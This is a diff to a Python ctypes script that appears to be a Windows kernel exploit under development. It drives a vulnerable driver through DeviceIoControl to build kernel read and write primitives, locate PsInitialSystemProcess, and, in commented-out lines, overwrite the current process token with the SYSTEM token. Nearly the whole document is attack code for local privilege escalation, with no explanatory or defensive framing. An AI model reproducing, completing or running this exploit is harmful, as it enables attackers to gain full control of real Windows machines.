@@ -35,9 +35,9 @@ ThreadBasicInformation = 0
 ################################################### ADDRESSES FOR MSDN ######################################################
 
 USER_ADDR = 0x000000001a000000
-USER_WRITE_TARGET_ADDR = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
+USER_WRITE_TARGET_ADDR = USER_ADDR + 0x0000 # Arbitrary offset inside BASEADDRESS 
 KERNEL_WRITE_TARGET_ADDR = 0x00 #We don't know this yet.
-USER_MEM_PAGE_PTR = USER_ADDR + 0x500 # Requires 16 byte offset in our defined user memory.
+USER_MEM_PAGE_PTR = USER_ADDR + 0x000 # Requires 16 byte offset in our defined user memory.
 CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
 BASEADDRESS = c_ulonglong(USER_ADDR)
 ALLOCATED_USER_MEM_SZ = c_ulonglong(0x3000)
@@ -170,12 +170,14 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
 
     # Calculate PsInitialSystemProcess offset in kernel land
 
-    ptr_to_system_proc_struct_base_ptr = kernel_base + PsISP_User_Address - kernel_handle
+    ptr_to_system_proc_struct_base_ptr = kernel_base + (PsISP_User_Address - kernel_handle)
     print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % ptr_to_system_proc_struct_base_ptr
 
-    PsISP_kernel_address = c_ulonglong()
+    #PsISP_kernel_address = c_ulonglong()
 
-    system_proc_struct_base_ptr = readPrimitive(driver, ptr_to_system_proc_struct_base_ptr, USER_MEM_PAGE_PTR)
+    system_proc_struct_base_ptr = kernelwriteQWORD(driver, ptr_to_system_proc_struct_base_ptr, USER_MEM_PAGE_PTR)
+    
+    print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_ADDR, POINTER(c_ulonglong))[0]
 
     return long(system_proc_struct_base_ptr)
 
@@ -216,21 +218,21 @@ def userwriteQWORD(driver, what=None, USER_MEM_PAGE_PTR=None):
 
 ################################################### KERNEL WRITE FUNCTION ###########################################################
 
-def kernelwriteQWORD(driver, system_token_address, CURRENT_PROCESS_BASE_STRUCT_PTR):
+def kernelwriteQWORD(driver, target_address_of_value, target_address_to_write_over):
     
-    # Write the what value (system_token_address) to CURRENT_PROCESS_BASE_STRUCT_PTR
+    # Write the what value address to target_address_to_write_over
 
-    data = struct.pack("<Q", system_token_address)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_MEM_PAGE_PTR, data, len(data), byref(written))
+    #data = struct.pack("<Q", target_address_of_value)
+    #dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, target_address_to_write_over, data, len(data), byref(written))
     
-    if dwStatus == 0:
-        print("Something went wrong while writing to memory","e")
-        sys.exit()
+    #if dwStatus == 0:
+        #print("Something went wrong while writing to memory","e")
+        #sys.exit()
 
     # Pack the address of the what value and the current target process address we want to overwrite.
 
-    data = struct.pack("<Q", USER_MEM_PAGE_PTR) + struct.pack("<Q", CURRENT_PROCESS_BASE_STRUCT_PTR)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_MEM_PAGE_PTR, data, len(data), byref(written))
+    data = struct.pack("<Q", target_address_of_value) + struct.pack("<Q", target_address_to_write_over)
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
     if dwStatus == 0:
         print("Something went wrong while writing to memory in the packing section","e")
         sys.exit()
@@ -243,10 +245,8 @@ def kernelwriteQWORD(driver, system_token_address, CURRENT_PROCESS_BASE_STRUCT_P
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    #print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    #print "Our memory target is: " + str(hex(USER_WRITE_TARGET_ADDR))
-    #print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
+
     return triggerIOCTL
 
 ################################################### READ ###########################################################
@@ -263,9 +263,7 @@ def readPrimitive(driver, USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
     lpBytesReturned = byref(dwBytesReturned)
 
     data = struct.pack('<QQ', USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE,
-            USER_ADDR, data, len(data), byref(written))
-
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
 
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
@@ -352,20 +350,6 @@ def executeOverwrite():
         PROC_FLINK_OFFSET = 0x2e8
         TOKEN_OFFSET = 0x358
 
-        print "MAIN Calculating System Token Address."
-        system_token_address = system_proc_struct_base_ptr + TOKEN_OFFSET
-
-        print "MAIN Reading the system_token from that address."
-        readPrimitive(driver, system_token_address, USER_ADDR)
-
-
-    
-
-
-            #EVENTUALLY WE DO THIS
-
-            #print "MAIN Attempting system to current token overwrite!"
-                                     #what         #where
             #kernelwriteQWORD(driver, system_token_address, current_token)
 
         #print "MAIN Success!"
